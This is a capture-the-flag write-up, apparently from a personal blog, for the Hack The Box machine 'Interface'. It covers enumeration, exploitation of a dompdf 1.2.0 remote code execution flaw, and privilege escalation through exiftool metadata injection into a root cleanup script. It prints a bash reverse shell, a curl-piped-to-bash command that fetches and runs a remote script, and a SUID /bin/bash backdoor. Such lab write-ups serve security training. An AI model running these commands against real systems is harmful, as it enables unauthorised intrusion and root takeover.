---
layout: post
title: "[HTB] Interface"
description: "[Machine] - Medium difficulty"
date: 2025-06-27 12:00:00
background: '/img/bg-machine.jpg'
tags: [htb]
difficulty: Easy
---

![Web recon](/img/htb_img/Interface_img/Interface.png)

OS: Linux
IP: 10.10.11.200
Complete: Yes
Level: Medium
Status: Done

# Enumeration

With the HTB VPN connected, we start enumerating the machine with `nmap` .

```bash
❯ sudo nmap -p- --open --min-rate 5000 -T4 -sS -n -Pn -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 16:52 CEST
Initiating SYN Stealth Scan at 16:52
Scanning 10.10.11.200 [65535 ports]
Discovered open port 80/tcp on 10.10.11.200
Discovered open port 22/tcp on 10.10.11.200
Completed SYN Stealth Scan at 16:53, 11.65s elapsed (65535 total ports)
Nmap scan report for 10.10.11.200
Host is up, received user-set (0.041s latency).
Scanned at 2025-06-27 16:52:54 CEST for 11s
Not shown: 65370 closed tcp ports (reset), 163 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.77 seconds
           Raw packets sent: 68278 (3.004MB) | Rcvd: 65979 (2.639MB)
```

Two services are available on the machine: `SSH` on port 22 and `HTTP` on port 80.

Next, the services and versions of both ports are scanned:

```bash
❯ nmap -p22,80 -sCV -Pn -oN targeted $target       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 17:14 CEST
Nmap scan report for 10.10.11.200
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:89:a0:95:7e:ce:ae:a8:59:6b:2d:2d:bc:90:b5:5a (RSA)
|   256 01:84:8c:66:d3:4e:c4:b1:61:1f:2d:4d:38:9c:42:c3 (ECDSA)
|_  256 cc:62:90:55:60:a6:58:62:9e:6b:80:10:5c:79:9b:55 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site Maintenance
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.39 seconds
```

The results show that the web service is `nginx 1.14.0` and the codenames of both services indicate that we are dealing with an Ubuntu Linux system.

## Web Recon

![Web recon](/img/htb_img/Interface_img/01.png)

When accessing the website, we can see that it is under maintenance and there is not much more information available, so we will have to perform some kind of `fuzzing`.

### Directory fuzzing

```bash
❯ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$target/FUZZ --hl=11
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.200/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                               
=====================================================================

^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 36660
Filtered Requests: 36660
Requests/sec.: 0
```

Nothing found even with other wordlists.

---

After not finding anything through directory, we proceed to check the browser’s developer console on the website and find that the `Content Security Policy` field reveals a new subdomain, which we will add to our hosts file.

![New subdomain](/img/htb_img/Interface_img/02.png)

```bash
❯ echo "$target interface.htb prd.m.rendering-api.interface.htb" | sudo tee -a /etc/hosts
10.10.11.200 interface.htb prd.m.rendering-api.interface.htb
```

---

## Subdomain: prd.m.rendering-api.interface.htb

When visiting the new subdomain, we are greeted with the message `File not found`, which may imply that there is some file or endpoint that works, so we proceed to run a new fuzzing.

```bash
❯ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://prd.m.rendering-api.interface.htb/FUZZ --hh=0
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://prd.m.rendering-api.interface.htb/FUZZ
Total requests: 43007

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                               
=====================================================================

000000144:   404        0 L      3 W        50 Ch       "api"                                                                                                                                                                 
000000400:   403        1 L      2 W        15 Ch       "."                                                                                                                                                                   
000002050:   403        1 L      2 W        15 Ch       "vendor"  
```

Since we have found an `api` directory, we will also perform fuzzing within this directory, using both GET and POST requests.

We get a hit on a POST request, payload `html2pdf`

```bash
❯ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://prd.m.rendering-api.interface.htb/api/FUZZ --hh=50 -X POST
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://prd.m.rendering-api.interface.htb/api/FUZZ
Total requests: 43007

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                               
=====================================================================

000008522:   422        0 L      2 W        36 Ch       "html2pdf"  
```

```bash
❯ curl -X POST http://prd.m.rendering-api.interface.htb/api/html2pdf                                                                                                                                   
{"status_text":"missing parameters"}
```

`html2pdf` means that html gets transformed to a pdf file, so we try to send html data into the request.

```bash
❯ curl -X POST http://prd.m.rendering-api.interface.htb/api/html2pdf -d '{"html":"<h1>g00dm0rn1ng</h1>"}' -o good.pdf           
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1167  100  1136  100    31  13975    381 --:--:-- --:--:-- --:--:-- 14407
```

![Web recon](/img/htb_img/Interface_img/03.png)


After visual inspection, we extract the metadata from the file to confirm the tool used to create the `PDF`.

```bash
❯ exiftool good.pdf                                                                      
ExifTool Version Number         : 13.25
File Name                       : good.pdf
Directory                       : .
File Size                       : 1136 bytes
File Modification Date/Time     : 2025:06:27 17:40:41+02:00
File Access Date/Time           : 2025:06:27 17:41:03+02:00
File Inode Change Date/Time     : 2025:06:27 17:40:41+02:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 1
Producer                        : dompdf 1.2.0 + CPDF
Create Date                     : 2025:06:27 15:40:30+00:00
Modify Date                     : 2025:06:27 15:40:30+00:00
```

So, the pdf was created with a tool named `dompdf` version 1.2.0.

Searching for this tool online, we can find some information about it:

<aside>
ℹ️

*dompdf is a library written in PHP that is used to generate PDF files from HTML and CSS code. It is widely used because it allows you to take a webpage or an HTML template and convert it into a PDF document quite easily.*

</aside>

After getting this information, we try to find some vulnerabilities, exploits or PoC so we can operate with this tool.

We find the following Github Repository:

[https://github.com/positive-security/dompdf-rce](https://github.com/positive-security/dompdf-rce)

---

# Foothold

Dompdf 1.2.0 contains a critical `Remote Code Execution (RCE)` vulnerability that allows attackers to execute arbitrary PHP code through carefully crafted CSS injection. This vulnerability represents a significant security flaw in how Dompdf processes CSS styles during PDF generation.

When Dompdf processes the malicious CSS, the embedded PHP code gets executed on the server, allowing attackers to perform various malicious activities such as file system access, command execution, or data exfiltration.

---

We clone the github repository of this exploit that we found previously:

```bash
❯ git clone https://github.com/positive-security/dompdf-rce.git                                         
Cloning into 'dompdf-rce'...
remote: Enumerating objects: 343, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 343 (delta 3), reused 13 (delta 1), pack-reused 326 (from 1)
Receiving objects: 100% (343/343), 3.99 MiB | 9.89 MiB/s, done.
Resolving deltas: 100% (64/64), done.

❯ cd dompdf-rce
```

We will modify the CSS to our needs:

![Web recon](/img/htb_img/Interface_img/04.png)


We also modify the php file to allow us to execute commands.

![Web recon](/img/htb_img/Interface_img/05.png)


After that, we execute two servers, one at port 9000 and the other at 9001.

```bash
❯ python3 -m http.server 9000
❯ python3 -m http.server 9001
```

And we run our exploit:

```bash
❯ curl http://prd.m.rendering-api.interface.htb/api/html2pdf -d '{"html":"<link rel=stylesheet href=\"http://10.10.X.X:9001/exploit.css\">"}'
```

After that we check for our md5sum, because it’s used to create the php file:

```bash
❯ echo -ne "http://10.10.X.X:9001/exploit_font.php" | md5sum         
05eee38048064022101b29bc7ca64806  -
```

So our md5sum is `05eee38048064022101b29bc7ca64806`.

```bash
❯ curl http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_05eee38048064022101b29bc7ca64806.php\?cmd\=id --output -

<...>

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Sooo, we have a foothold to execure a reverse shell to our machine:

```bash
❯ cat shell.sh       
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: shell.sh
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/bin/bash
   2   │ 
   3   │ bash -i >&/dev/tcp/10.10.X.X/4444 0>&1
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

So we will execute a curl to retrieve this information through RCE and the pipe a Bash to it to execute it.

First we start a listener locally:

```bash
❯ nc -lvnp 4444                             
listening on [any] 4444 ...
```

```bash
❯ curl "http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_05eee38048064022101b29bc7ca64806.php?cmd=curl+10.10.X.X:9001/shell.sh|bash" --output -
```

And in our listener we get a shell as `www-data`.

```bash
❯ nc -lvnp 4444                             
listening on [any] 4444 ...
connect to [10.10.X.X] from (UNKNOWN) [10.10.11.200] 47828
bash: cannot set terminal process group (1369): Inappropriate ioctl for device
bash: no job control in this shell
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$
```

### (Optional) Shell stabilization

We can stabilize our shell with 3 simple steps: 

1. Bash process creation
2. STTY stab
3. Xterm resetting

```bash
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ script /dev/null -c bash
<CTRL+Z>

❯ stty raw -echo;fg          
[1]  + 44802 continued  nc -lvnp 4444

www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ export TERM=xterm
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ reset xterm
```

We should also configure the rows and columns of our terminal emulator with `stty`

Locally we check our rows and columns:

```bash
❯ stty size        
53 231
```

In our reverse shell we configure exactly those rows and columns:

```bash
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ stty rows 53 columns 231
```

---

## USER FLAG

As `www-data`, we can read the user flag in the home of `dev`.

```bash
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ ls /home
dev
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ ls /home/dev
user.txt
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ cat /home/dev/user.txt 
<**REDACTED**>
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ 
```

# Lateral Movement

# Privilege Escalation

After looking for credentials in files, we opt to upload an instance of `pspy`, a tool created to spy every command or process that executes code in memory.

```bash
www-data@interface:/tmp$ wget 10.10.X.X:9001/pspy
--2025-06-27 16:21:44--  http://10.10.X.X:9001/pspy
Connecting to 10.10.X.X:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy'

pspy                                                      100%[====================================================================================================================================>]   2.96M  8.21MB/s    in 0.4s    

2025-06-27 16:21:45 (8.21 MB/s) - 'pspy' saved [3104768/3104768]

www-data@interface:/tmp$ chmod +x pspy
www-data@interface:/tmp$ ./pspy
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
```

And we find the following:

```bash
CMD: UID=0     PID=3070   | /bin/bash /usr/local/sbin/cleancache.sh
```

```bash
## /usr/local/sbin/cleancache.sh
#! /bin/bash
cache_directory="/tmp"
for cfile in "$cache_directory"/*; do

    if [[ -f "$cfile" ]]; then

        meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)

        if [[ "$meta_producer" -eq "dompdf" ]]; then
            echo "Removing $cfile"
            rm "$cfile"
        fi

    fi

done
```

This code scans the `/tmp` folder and extracts the metadata from all files, and then it deletes them.

It extracts specifically the `Producer` metadata, so we can try to put something in there.

The code is vulnerable to quoted expression injection

```bash
    if [[ -f "$cfile" ]]; then
```

So we create a file that modifies the SUID bit to the Bash binary:

```bash
www-data@interface:/tmp$ mkdir nothere

www-data@interface:/tmp$ echo -ne '#!/bin/bash\nchmod u+s /bin/bash' > nothere/owned

www-data@interface:/tmp$ chmod +x nothere/owned

www-data@interface:/tmp$ ls -lah /bin/bash
	-rwxr-xr-x 1 root root 1.1M Apr 18  2022 /bin/bash
```

After that, we create a new file and link the `Producer` metadata to this file.

```bash
www-data@interface:/tmp$ touch pwn

www-data@interface:/tmp$ exiftool -Producer='w[$(/tmp/nothere/owned)]' pwn
	1 image files updated
```

After a couple of seconds, we see that the file has been deleted, meaning that our payload has been executed.

We can check the `bash` binary and upgrade to Root Shell.

```bash
www-data@interface:/tmp$ ls -lah /bin/bash
-rwsr-xr-x 1 root root 1.1M Apr 18  2022 /bin/bash

www-data@interface:/tmp$ bash -p

bash-4.4# cat /root/root.txt
<**REDACTED**>
```

Pwned!
